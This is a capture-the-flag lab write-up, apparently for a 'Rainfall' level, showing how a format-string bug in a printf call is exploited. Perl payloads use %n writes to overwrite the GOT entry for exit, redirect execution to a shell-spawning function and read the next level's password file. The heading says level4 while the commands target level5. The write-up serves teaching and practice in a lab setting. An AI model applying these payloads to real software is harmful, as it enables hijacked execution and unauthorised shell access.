# level4

Pull the executable:

```sh
sshpass -f ../level3/flag scp level4@rainfall:level4 .
```

See `source.c` for source reconstitution.

This exercise is also similar to the previous.  It does not have a direct flow to a shell or the flag, and the call to `printf(3)` is not nested.  There is a function `o` that opens a shell though, so our goal is to somehow make the CPU jump to that function.

As we saw in level4, there doesn't seem to exist a way to modify the call stack saved addresses by only using `printf(3)`.

There are other writable locations in this program.  One of them is the Global Offset Table (GOT for short) which holds offsets for dynamic linking.  It is used by the Procedure Linkage Table (PLT for short) to jump to the appropriate function in shared libraries.  The PLT is read-only since it's created and filled at compile time, but the GOT is writable because it's filled by the dynamic linker at execution.  And because the GOT is just a bunch of function pointers, overriding it with `"%n"` should be easy enough.

Let's write a NULL to the GOT entry for `exit(3)`:

```sh
perl -e 'print "%5\$n", pack("L<", 0x08049838)' > /tmp/5

gdb ./level5
r </tmp/5
```

We get:

```
Program received signal SIGSEGV, Segmentation fault.
0x00000000 in ?? ()
```

It seems to be working. Let's try to put another arbitrary value:

```sh
perl -e 'print pack("L<", 0x08049838), "%1\$1000u", "%4\$n", "\n"' > /tmp/5

gdb ./level5
r </tmp/5
```

We get:

```
[...] 512

Program received signal SIGSEGV, Segmentation fault.
0x000003ec in ?? ()
```

`0x3ec` is 1004 in decimal, which is what we wanted (4 bytes from the address, 1000 bytes from `"%1$1000u"`).  Now we just need to write the address of `o` minus 4 as padding and it should be over.

```sh
perl -e 'print pack("L<", 0x08049838), "%1\$134513824u", "%4\$n", "\n"' > /tmp/5
cat /tmp/5 - | ./level5
```

Again, the output might take some time to display on a terminal over SSH but we do get a shell.  `cat ~level6/.pass` and it's done.
